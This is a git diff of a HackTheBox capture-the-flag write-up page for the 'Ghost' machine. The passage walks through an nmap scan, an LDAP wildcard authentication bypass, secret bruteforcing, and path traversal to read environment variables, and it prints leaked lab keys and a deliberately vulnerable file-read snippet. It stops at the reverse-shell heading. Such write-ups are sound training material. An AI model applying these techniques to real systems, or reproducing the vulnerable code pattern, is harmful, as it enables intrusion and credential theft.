@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Ghost - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Ghost.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Ghost machine from HackTheBox - Insane difficulty level">
+    <meta name="description" content="Detailed writeup for Ghost machine from HackTheBox - Insane difficulty level">
     <meta name="keywords" content="HackTheBox, Ghost, Insane, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,377 @@
         <h1 class="writeup-title">Ghost</h1>
         <div class="writeup-metadata">
             <span class="difficulty insane">Insane</span>
-            <span class="date">Active machine</span>
+            <span class="date">April 5, 2025</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="Ghost" src="../images/Ghost/pwned.png" /></p>
-<p>Ghost is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once Ghost retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+                <p><img alt="pwned" src="../images/Ghost/pwned.png" /></p>
+<p>Ghost was a beast of an insane machine that tested multiple advanced Active Directory attack techniques across interconnected Windows domains. The challenge began with discovering an LDAP authentication vulnerability in an intranet portal, where using wildcards (*) in password fields allowed for successful authentication bypass. This revealed numerous potential user accounts that could be targeted.</p>
+<p>The journey continued with finding a Gitea repository containing sensitive information about a Ghost CMS blog implementation. Analysis of the code revealed a critical path traversal vulnerability that allowed reading environment variables, exposing a development API key. This key granted access to a poorly secured API endpoint with a command injection vulnerability in a URL scanning feature, leading to the first reverse shell on a Docker container.</p>
+<p>Further reconnaissance revealed a Kerberos ticket for florence.ramirez, providing an opportunity to pivot and perform DNS poisoning. By manipulating DNS records, I  intercepted a connection from justin.bradley and captured his NTLMv2 hash, which was successfully cracked. This access allowed for capturing the user flag and discovering that Justin had permissions to read GMSA passwords.</p>
+<p>The privilege escalation path involved extracting the ADFS$ service account password, permitting a sophisticated golden SAML attack against the federation service. After generating a forged SAML response, I  gained authenticated access to a federated application with SQL debugging capabilities. By exploiting linked SQL servers, command execution on the primary database server was achieved as the mssql-service account.</p>
+<p>Final escalation to System involved leveraging SeImpersonatePrivilege with EfsPotato to gain SYSTEM-level access. The ultimate compromise was achieved by exploiting the bidirectional trust relationship between domains, creating a golden ticket with Mimikatz and using Rubeus to access the Domain Controller and capture the root flag.</p>
+<p>The machine brilliantly showcased a variety of modern Active Directory attack techniques, from initial LDAP authentication bypass through complex trust relationship exploitation, making it an exceptional challenge for advanced penetration testers.</p>
+<h1>User flag</h1>
+<p>The initial nmap scan reveals many ports.</p>
+<div class="codehilite"><pre><span></span><code><span class="err">┌──</span><span class="p">(</span><span class="nx">kali</span><span class="err">㉿</span><span class="nx">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="nx">Ghost</span><span class="p">]</span>
+<span class="err">└─$</span><span class="w"> </span><span class="nx">nmap</span><span class="w"> </span><span class="o">-</span><span class="nx">sV</span><span class="w"> </span><span class="o">-</span><span class="nx">sC</span><span class="w"> </span><span class="o">-</span><span class="nx">Pn</span><span class="w"> </span><span class="o">-</span><span class="nx">oA</span><span class="w"> </span><span class="nx">Ghost</span><span class="w"> </span><span class="m m-Double">10.10.11.24</span>
+<span class="nx">Starting</span><span class="w"> </span><span class="nx">Nmap</span><span class="w"> </span><span class="m m-Double">7.95</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org ) at 2025-02-25 22:19 GMT</span>
+<span class="nx">Nmap</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">ghost</span><span class="p">.</span><span class="nx">htb</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">10.10.11.24</span><span class="p">)</span>
+<span class="nx">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">up</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">0.10</span><span class="nx">s</span><span class="w"> </span><span class="nx">latency</span><span class="p">).</span>
+<span class="nx">Not</span><span class="w"> </span><span class="nx">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">981</span><span class="w"> </span><span class="nx">filtered</span><span class="w"> </span><span class="nx">tcp</span><span class="w"> </span><span class="nx">ports</span><span class="w"> </span><span class="p">(</span><span class="nx">no</span><span class="o">-</span><span class="nx">response</span><span class="p">)</span>
+<span class="nx">PORT</span><span class="w">     </span><span class="nx">STATE</span><span class="w"> </span><span class="nx">SERVICE</span><span class="w">       </span><span class="nx">VERSION</span>
+<span class="mi">53</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">domain</span><span class="w">        </span><span class="nx">Simple</span><span class="w"> </span><span class="nx">DNS</span><span class="w"> </span><span class="nx">Plus</span>
+<span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span><span class="w">          </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">HTTPAPI</span><span class="w"> </span><span class="nx">httpd</span><span class="w"> </span><span class="m m-Double">2.0</span><span class="w"> </span><span class="p">(</span><span class="nx">SSDP</span><span class="o">/</span><span class="nx">UPnP</span><span class="p">)</span>
+<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">Found</span>
+<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span><span class="w"> </span><span class="nx">Microsoft</span><span class="o">-</span><span class="nx">HTTPAPI</span><span class="o">/</span><span class="m m-Double">2.0</span>
+<span class="mi">88</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">kerberos</span><span class="o">-</span><span class="nx">sec</span><span class="w">  </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Kerberos</span><span class="w"> </span><span class="p">(</span><span class="nx">server</span><span class="w"> </span><span class="nx">time</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">25</span><span class="w"> </span><span class="mi">22</span><span class="p">:</span><span class="mi">19</span><span class="p">:</span><span class="mi">47</span><span class="nx">Z</span><span class="p">)</span>
+<span class="mi">135</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">msrpc</span><span class="w">         </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">RPC</span>
+<span class="mi">139</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span><span class="w">   </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span>
+<span class="mi">389</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">ldap</span><span class="w">          </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="p">(</span><span class="nx">Domain</span><span class="p">:</span><span class="w"> </span><span class="nx">ghost</span><span class="p">.</span><span class="nx">htb0</span><span class="p">.,</span><span class="w"> </span><span class="nx">Site</span><span class="p">:</span><span class="w"> </span><span class="nx">Default</span><span class="o">-</span><span class="nx">First</span><span class="o">-</span><span class="nx">Site</span><span class="o">-</span><span class="nx">Name</span><span class="p">)</span>
+<span class="mi">443</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">https</span><span class="p">?</span>
+<span class="mi">445</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">microsoft</span><span class="o">-</span><span class="nx">ds</span><span class="p">?</span>
+<span class="mi">464</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">kpasswd5</span><span class="p">?</span>
+<span class="mi">593</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">ncacn_http</span><span class="w">    </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">RPC</span><span class="w"> </span><span class="nx">over</span><span class="w"> </span><span class="nx">HTTP</span><span class="w"> </span><span class="m m-Double">1.0</span>
+<span class="mi">636</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">ssl</span><span class="o">/</span><span class="nx">ldap</span><span class="w">      </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="p">(</span><span class="nx">Domain</span><span class="p">:</span><span class="w"> </span><span class="nx">ghost</span><span class="p">.</span><span class="nx">htb0</span><span class="p">.,</span><span class="w"> </span><span class="nx">Site</span><span class="p">:</span><span class="w"> </span><span class="nx">Default</span><span class="o">-</span><span class="nx">First</span><span class="o">-</span><span class="nx">Site</span><span class="o">-</span><span class="nx">Name</span><span class="p">)</span>
+<span class="mi">1433</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ms</span><span class="o">-</span><span class="nx">sql</span><span class="o">-</span><span class="nx">s</span><span class="w">      </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">SQL</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="mi">2022</span><span class="w"> </span><span class="m m-Double">16.00.1000.00</span><span class="p">;</span><span class="w"> </span><span class="nx">RTM</span>
+<span class="mi">2179</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">vmrdp</span><span class="p">?</span>
+<span class="mi">3268</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ldap</span><span class="w">          </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="p">(</span><span class="nx">Domain</span><span class="p">:</span><span class="w"> </span><span class="nx">ghost</span><span class="p">.</span><span class="nx">htb0</span><span class="p">.,</span><span class="w"> </span><span class="nx">Site</span><span class="p">:</span><span class="w"> </span><span class="nx">Default</span><span class="o">-</span><span class="nx">First</span><span class="o">-</span><span class="nx">Site</span><span class="o">-</span><span class="nx">Name</span><span class="p">)</span>
+<span class="mi">3269</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ssl</span><span class="o">/</span><span class="nx">ldap</span><span class="w">      </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="p">(</span><span class="nx">Domain</span><span class="p">:</span><span class="w"> </span><span class="nx">ghost</span><span class="p">.</span><span class="nx">htb0</span><span class="p">.,</span><span class="w"> </span><span class="nx">Site</span><span class="p">:</span><span class="w"> </span><span class="nx">Default</span><span class="o">-</span><span class="nx">First</span><span class="o">-</span><span class="nx">Site</span><span class="o">-</span><span class="nx">Name</span><span class="p">)</span>
+<span class="mi">3389</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ms</span><span class="o">-</span><span class="nx">wbt</span><span class="o">-</span><span class="nx">server</span><span class="w"> </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Terminal</span><span class="w"> </span><span class="nx">Services</span>
+<span class="mi">5985</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span><span class="w">          </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">HTTPAPI</span><span class="w"> </span><span class="nx">httpd</span><span class="w"> </span><span class="m m-Double">2.0</span><span class="w"> </span><span class="p">(</span><span class="nx">SSDP</span><span class="o">/</span><span class="nx">UPnP</span><span class="p">)</span>
+<span class="mi">8008</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span><span class="w">          </span><span class="nx">nginx</span><span class="w"> </span><span class="m m-Double">1.18.0</span><span class="w"> </span><span class="p">(</span><span class="nx">Ubuntu</span><span class="p">)</span>
+<span class="mi">8443</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ssl</span><span class="o">/</span><span class="nx">http</span><span class="w">      </span><span class="nx">nginx</span><span class="w"> </span><span class="m m-Double">1.18.0</span><span class="w"> </span><span class="p">(</span><span class="nx">Ubuntu</span><span class="p">)</span>
+</code></pre></div>
+
+<p>I can see ldap, as well as some kerberos-related ports. Adding in the revealed domain name, I can conclude that this is most definitely an Active Directory scenario!
+There are two websites that I can explore. core.ghost.htb on port 8443 and another one on port 8008. I'll check out the one at 8443 first.</p>
+<p><img alt="ADFS" src="../images/Ghost/ADFS.png" /></p>
+<p>Active Directory Federation Services... There's not much I  can do here without credentials. I can see a SAML request in the URL bar, but for now, I'll leave this untouched.</p>
+<p><img alt="8008" src="../images/Ghost/8008.png" /></p>
+<p>On the port 8008, I can see a seemingly regular ghost website... I'll fuzz for subdomains, since I cant really do anything here.</p>
+<p><img alt="ffuf8008" src="../images/Ghost/ffuf8008.png" /></p>
+<p>Fuzzing yields me intranet and gitea subdomains. I'll check gitea first.
+(A note from the future: The fuzzing wordlist chosen by me does NOT contain gitea by default. I have added some words that were not there previously after fuzzing in the past)</p>
+<p><img alt="giteaexploreusers" src="../images/Ghost/giteaexploreusers.png" /></p>
+<p>While exploring, I found two users. However, I cannot see any repos without logging in. I'll turn my focus towards the intranet subdomain now.</p>
+<h2>Authentication Bypass</h2>
+<p><img alt="intranetlogin" src="../images/Ghost/intranetlogin.png" /></p>
+<p>Weird... Instead of a password, I need to provide a secret. This is unusual for me, so I'll take a look at the process through burpsuite.</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/login</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">intranet.ghost.htb:8008</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">832</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36</span>
+<span class="na">Next-Action</span><span class="o">:</span> <span class="l">c471eb076ccac91d6f828b671795550fd5925940</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.9</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">text/x-component</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=----WebKitFormBoundaryPW0d5Cji9pMOg5Ue</span>
+<span class="na">Next-Router-State-Tree</span><span class="o">:</span> <span class="l">%5B%22%22%2C%7B%22children%22%3A%5B%22login%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D</span>
+<span class="na">Origin</span><span class="o">:</span> <span class="l">http://intranet.ghost.htb:8008</span>
+<span class="na">Referer</span><span class="o">:</span> <span class="l">http://intranet.ghost.htb:8008/login</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
+
+------WebKitFormBoundaryPW0d5Cji9pMOg5Ue
+Content-Disposition: form-data; name=&quot;1_$ACTION_REF_1&quot;
+
+
+------WebKitFormBoundaryPW0d5Cji9pMOg5Ue
+Content-Disposition: form-data; name=&quot;1_$ACTION_1:0&quot;
+
+{&quot;id&quot;:&quot;c471eb076ccac91d6f828b671795550fd5925940&quot;,&quot;bound&quot;:&quot;$@1&quot;}
+------WebKitFormBoundaryPW0d5Cji9pMOg5Ue
+Content-Disposition: form-data; name=&quot;1_$ACTION_1:1&quot;
+
+[{}]
+------WebKitFormBoundaryPW0d5Cji9pMOg5Ue
+Content-Disposition: form-data; name=&quot;1_$ACTION_KEY&quot;
+
+k2982904007
+------WebKitFormBoundaryPW0d5Cji9pMOg5Ue
+Content-Disposition: form-data; name=&quot;1_ldap-username&quot;
+
+test
+------WebKitFormBoundaryPW0d5Cji9pMOg5Ue
+Content-Disposition: form-data; name=&quot;1_ldap-secret&quot;
+
+test
+------WebKitFormBoundaryPW0d5Cji9pMOg5Ue
+Content-Disposition: form-data; name=&quot;0&quot;
+
+[{},&quot;$K1&quot;]
+------WebKitFormBoundaryPW0d5Cji9pMOg5Ue--
+</code></pre></div>
+
+<p>It authenticates via LDAP! I'll try logging into one of the accounts discovered from Gitea. Even though I don’t know any passwords, the process itself may reveal something useful.</p>
+<p>I'll start with cassandra.shelton.</p>
+<p><img alt="correctlogin" src="../images/Ghost/correctlogin.png" /></p>
+<p>Surprisingly, the login succeeded with * as the secret. This suggests an LDAP authentication misconfiguration, where wildcard values are accepted instead of requiring a valid secret.</p>
+<p>This means I can log in as any user without knowing their credentials!</p>
+<p>Before that, however, I'll see what information there is to find within intranet.</p>
+<p><img alt="userlist" src="../images/Ghost/userlist.png" /></p>
+<p>In the users tab, I discovered many potential users! I'll save those to a list so that I can test for their validity once possible.</p>
+<p>In the forums tab, I found a potential attack surface that could allow me to gain a hash.</p>
+<p><img alt="bitbucket" src="../images/Ghost/bitbucket.png" /></p>
+<p>Justin Bradley is using a script that repeatedly connects to gitea and bitbucket. Since Kathryn says that the DNS record is not set yet, I may be able to insert a malicious bitbucket DNS record pointing back to my machine.
+That way, I would be able to use responder and snatch Justin's NTLMv2 hash. That'll come later though, as for now, I dont have any viable users.</p>
+<h2>Finding a way to bruteforce secrets</h2>
+<p>Since I know that wildcards work on the login form, I'll try to see if there is a way to bruteforce the passwords.</p>
+<h3>Identifying a Difference in Responses</h3>
+<p>Using Burp Suite, I tested different login attempts and noticed a key difference in the server’s responses:</p>
+<ol>
+<li>Incorrect guesses always returned a 200 status code.</li>
+<li>Correct guesses resulted in a 303 redirect.</li>
+</ol>
+<p>This means I can bruteforce the password character-by-character by appending a * wildcard and monitoring the response!</p>
+<h3>Bruteforcing the secrets</h3>
+<p>To automate the process, I wrote a Python script that:</p>
+<ul>
+<li>Iterates through possible characters (a-z, 0-9).</li>
+<li>Attempts a login with the so-far pieced together password.</li>
+<li>Checks the response status code:</li>
+<li>If 200, move to the next character.</li>
+<li>If 303, save the character and continue.</li>
+<li>Stops when a full password is found (confirmed by receiving a 303 status code without appending a * at the end).</li>
+</ul>
+<p><img alt="effect" src="../images/Ghost/effect.png" /></p>
+<p>Gitea temp account password discovered! With that, I'll try logging into gitea.
+In the background, I'll run the script against cassandra.shelton and see if I can get her secret.</p>
+<h2>Gitea exploration</h2>
+<p><img alt="gitea" src="../images/Ghost/gitea.png" /></p>
+<p>I logged in as gitea_temp_principal! The script did uncover Cassandra's secret as well, but it did not work as her password for gitea.</p>
+<p>I can immediately see two commits for one repo. I'll check the upper commit first. </p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># Ghost Blog</span>
+
+<span class="n">Our</span><span class="w"> </span><span class="n">blog</span><span class="w"> </span><span class="n">uses</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Ghost</span><span class="w"> </span><span class="n">CMS</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">Docker</span><span class="w"> </span><span class="n">container</span><span class="p">.</span>
+
+<span class="n">We</span><span class="w"> </span><span class="n">are</span><span class="w"> </span><span class="n">planning</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">adding</span><span class="w"> </span><span class="n">additional</span><span class="w"> </span><span class="n">features</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">blog</span><span class="p">.</span><span class="w"> </span><span class="k">One</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">them</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="k">connection</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">intranet</span><span class="p">.</span><span class="w"> </span><span class="k">For</span><span class="w"> </span><span class="n">example</span><span class="p">,</span><span class="w"> </span><span class="k">some</span><span class="w"> </span><span class="n">posts</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">featured</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">our</span><span class="w"> </span><span class="n">intranet</span><span class="p">,</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="n">URLs</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">posts</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">scanned</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">intranet</span><span class="p">.</span>
+<span class="n">However</span><span class="p">,</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">still</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">development</span><span class="p">,</span><span class="w"> </span><span class="n">so</span><span class="w"> </span><span class="k">some</span><span class="w"> </span><span class="n">features</span><span class="w"> </span><span class="n">are</span><span class="w"> </span><span class="n">behind</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">API</span><span class="w"> </span><span class="k">key</span><span class="p">,</span><span class="w"> </span><span class="n">shared</span><span class="w"> </span><span class="k">between</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">intranet</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">blog</span><span class="p">.</span><span class="w"> </span><span class="n">It</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">named</span><span class="w"> </span><span class="n n-Quoted">`DEV_INTRANET_KEY`</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="k">stored</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">environment</span><span class="w"> </span><span class="n">variable</span><span class="p">.</span>
+
+<span class="n">We</span><span class="w"> </span><span class="n">modified</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="kt">bit</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Ghost</span><span class="w"> </span><span class="n">CMS</span><span class="w"> </span><span class="k">source</span><span class="w"> </span><span class="k">code</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">accomodate</span><span class="w"> </span><span class="n">such</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">features</span><span class="p">.</span><span class="w"> </span><span class="k">One</span><span class="w"> </span><span class="n">example</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n n-Quoted">`posts-public.js`</span><span class="w"> </span><span class="k">file</span><span class="p">,</span><span class="w"> </span><span class="n">which</span><span class="w"> </span><span class="n">allows</span><span class="w"> </span><span class="n">us</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">extract</span><span class="w"> </span><span class="n">additional</span><span class="w"> </span><span class="n">information</span><span class="w"> </span><span class="n">about</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">posts</span><span class="p">.</span>
+<span class="k">In</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">future</span><span class="w"> </span><span class="n">we</span><span class="w"> </span><span class="n">should</span><span class="w"> </span><span class="n">move</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">information</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">database</span><span class="w"> </span><span class="n">so</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">we</span><span class="w"> </span><span class="n">don</span><span class="s1">&#39;t accidentally lose data on container recreation. Make sure to replace the file when running, or just use the provided Dockerfile.</span>
+
+<span class="s1">Also, the public API in Ghost needs an API key. We can write it here since it only allows access to public data: `a5af628828958c976a3b6cc81a`</span>
+</code></pre></div>
+
+<p>This README file immediately caught my attention. It reveals that there is an environment variable DEV_INTRANET_KEY. If I can exploit a Local File Inclusion (LFI) vulnerability, I may be able to retrieve it.</p>
+<p>It also reveals a public API key... if there is a public key, then there may be a private one somewhere too!</p>
+<p>Keeping that in mind, I continued exploring the commit and found an interesting .js file at the bottom.</p>
+<div class="codehilite"><pre><span></span><code><span class="err">###</span><span class="w"> </span><span class="n">Code</span><span class="w"> </span><span class="n">snippet</span>
+<span class="w">  </span><span class="n">const</span><span class="w"> </span><span class="n">posts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="n">postsService</span><span class="p">.</span><span class="n">browsePosts</span><span class="p">(</span><span class="n">options</span><span class="p">);</span>
+<span class="w">  </span><span class="n">const</span><span class="w"> </span><span class="n">extra</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">frame</span><span class="p">.</span><span class="n">original</span><span class="p">.</span><span class="n">query</span><span class="vm">?</span><span class="p">.</span><span class="n">extra</span><span class="p">;</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">extra</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
+<span class="w">      </span><span class="n">const</span><span class="w"> </span><span class="n">fs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">require</span><span class="p">(</span><span class="ss">&quot;fs&quot;</span><span class="p">);</span>
+<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">fs</span><span class="p">.</span><span class="n">existsSync</span><span class="p">(</span><span class="n">extra</span><span class="p">))</span><span class="w"> </span><span class="err">{</span>
+<span class="w">          </span><span class="n">const</span><span class="w"> </span><span class="n">fileContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fs</span><span class="p">.</span><span class="n">readFileSync</span><span class="p">(</span><span class="ss">&quot;/var/lib/ghost/extra/&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">extra</span><span class="p">,</span><span class="w"> </span><span class="err">{</span><span class="w"> </span><span class="nl">encoding</span><span class="p">:</span><span class="w"> </span><span class="ss">&quot;utf8&quot;</span><span class="w"> </span><span class="err">}</span><span class="p">);</span>
+<span class="w">          </span><span class="n">posts</span><span class="p">.</span><span class="n">meta</span><span class="p">.</span><span class="n">extra</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">{</span><span class="w"> </span><span class="o">[</span><span class="n">extra</span><span class="o">]</span><span class="err">:</span><span class="w"> </span><span class="n">fileContent</span><span class="w"> </span><span class="err">}</span><span class="p">;</span>
+</code></pre></div>
+
+<p>fs is a Node.js module that interacts with the filesystem. The extra parameter is user-controlled and directly used in file operations without proper sanitization. This could allow me to include arbitrary files in the response.</p>
+<p>If I can escape the extra directory via path traversal, I may be able to read /proc/self/environ, which could expose sensitive environment variables like DEV_INTRANET_KEY.</p>
+<p><img alt="pathtraversal" src="../images/Ghost/pathtraversal.png" /></p>
+<p>Confirmed! With this, I can get the environmental variables and the intranet key.</p>
+<p><img alt="env" src="../images/Ghost/env.png" /></p>
+<p>And there it is—the DEV_INTRANET_KEY I was looking for!</p>
+<div class="codehilite"><pre><span></span><code><span class="n">DEV_INTRANET_KEY</span><span class="o">=</span><span class="err">!</span><span class="nv">@yqr</span><span class="err">!</span><span class="n">X2kxmQ</span><span class="p">.</span><span class="nv">@Xe</span>
+</code></pre></div>
+
+<p>I also found a database file, but after inspecting its contents there wasn’t anything useful inside.</p>
+<h2>Reverse shell in the docker container</h2>
+<p>In the main page of the intranet repository, I found an interesting note:</p>
+<div class="codehilite"><pre><span></span><code><span class="nv">Intranet</span>
+
